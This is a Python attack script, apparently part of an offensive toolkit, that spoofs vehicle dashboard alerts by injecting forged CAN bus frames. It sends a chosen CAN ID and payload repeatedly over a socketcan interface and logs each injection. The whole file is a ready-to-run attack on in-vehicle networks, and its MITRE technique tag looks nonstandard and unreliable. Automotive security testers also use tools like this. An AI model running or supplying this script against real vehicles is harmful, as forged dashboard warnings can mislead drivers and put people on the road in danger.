#!/usr/bin/env python3
# modules/attacks/vehicle_dashboard_spoofer.py

import os
import time
import argparse
import can
import json
from datetime import datetime

LOG_FILE = "results/dashboard_spoof_log.json"
MITRE_TTP = "T8210"

def log_spoof(msg_id, data):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "can_id": hex(msg_id),
        "data": list(data),
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def inject_dashboard_warning(interface, msg_id, data, count):
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    msg = can.Message(arbitration_id=msg_id, data=data, is_extended_id=False)
    for i in range(count):
        try:
            bus.send(msg)
            print(f"[+] Sent spoofed CAN message: ID={hex(msg_id)}, DATA={data}")
            log_spoof(msg_id, data)
            time.sleep(1)
        except Exception as e:
            print(f"[!] Failed to send CAN message: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof vehicle dashboard alerts via CAN bus")
    parser.add_argument("--iface", default="can0", help="CAN interface (default: can0)")
    parser.add_argument("--id", type=lambda x: int(x, 16), required=True, help="CAN ID (hex)")
    parser.add_argument("--data", required=True, help="8 bytes as hex (e.g. 'FF00000000000000')")
    parser.add_argument("--count", type=int, default=5, help="Number of spoofed messages")
    args = parser.parse_args()
    data_bytes = bytes.fromhex(args.data)
    if len(data_bytes) != 8:
        print("[!] Must provide exactly 8 bytes of CAN data.")
    else:
        inject_dashboard_warning(args.iface, args.id, data_bytes, args.count)
